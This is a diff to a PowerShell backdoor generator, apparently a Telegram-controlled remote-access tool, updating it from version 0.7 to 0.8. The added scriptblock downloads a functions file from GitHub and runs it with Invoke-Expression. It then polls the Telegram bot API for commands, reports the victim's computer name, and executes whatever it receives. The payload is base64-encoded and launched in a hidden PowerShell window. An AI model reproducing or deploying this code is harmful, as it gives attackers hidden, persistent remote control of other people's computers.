@@ -1,6 +1,6 @@
 clear
 $ErrorActionPreference = "SilentlyContinue"
-$version = "0.7"
+$version = "0.8"
 
 $banner = "    ____  _____ ____      ______     __                              
    / __ \/ ___// __ )____/_  __/__  / /__   ____ __________ _____ __
@@ -81,9 +81,20 @@ return $codeScript
 
 ############################################################### ScriptBlock del Backdoor ###############################################################
 $scriptblock = '
-IEX (Invoke-WebRequest "https://raw.githubusercontent.com/cybervaca/psbotelegram/master/Functions.ps1").content
-$agent_bot ($agent_bot = create_agent -botkey your_toke -chat_id your_chat_id -delay your_delay); IEX $agent_bot'
-$scriptblock = $scriptblock -replace "your_token", "$your_token" -replace "your_chat_id", "$your_chat_id" -replace "your_delay", "$your_delay" -replace "con bypassuac :D",""
+[string]$botkey = "your_token";[string]$bot_Master_ID = "your_chat_id";[int]$delay = "your_delay"
+IEX (Invoke-WebRequest "https://raw.githubusercontent.com/hackplayers/psbotelegram/master/Functions.ps1").content 
+$chat_id = $bot_Master_ID ; $getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates";[int]$first_connect = "1"
+while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json
+    $l = $json.result.length
+	$i = 0
+if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected :D"; envia-mensaje -text $texto -chat $chat_id -botkey $botkey; $first_connect = $first_connect + 1}
+	while ($i -lt $l) {$offset = $json.result[$i].update_id + 1
+        $comando = $json.result[$i].message.text
+        test-command -comando $comando -botkey $botkey -chat_id $chat_id -first_connect $first_connect
+   	$i++
+	}
+	Start-Sleep -s $delay ;$first_connect++}'
+$scriptblock = $scriptblock -replace "your_token", "$your_token" -replace "your_chat_id", "$your_chat_id" -replace "your_delay", "$your_delay"
 $code = code_a_base64 -code $scriptblock; $code = "powershell.exe -win hidden -enc $code"
 
 ######################################################## Tipos de Archivos #######################################################################
